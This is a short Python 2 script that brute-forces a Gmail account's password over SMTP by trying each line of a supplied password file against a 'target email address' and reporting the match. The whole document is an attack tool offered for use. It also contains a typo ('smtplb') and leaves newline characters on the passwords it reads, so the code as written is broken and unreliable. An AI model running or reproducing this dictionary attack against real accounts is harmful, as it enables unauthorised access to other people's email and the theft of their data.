import smtplib

smtpserver = smtplb.SMTP("smtp.gmail.com", 587)

#connects to server
smtpserver.ehlo()
#creates gmail encrypted connection
smtpserver.starttls()

user = raw_input("Enter target email address: ")
passwordfile = raw_input("Enter the password file")

passwordfile = open(passwordfile, "r")
count = 0
for password in passwordfile:
	count += 1
	try:
		smtpserver.login(user, password)
		print "[+] Password Match: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Attempt # %s Password Incorrect: %s" % (str(count), password)

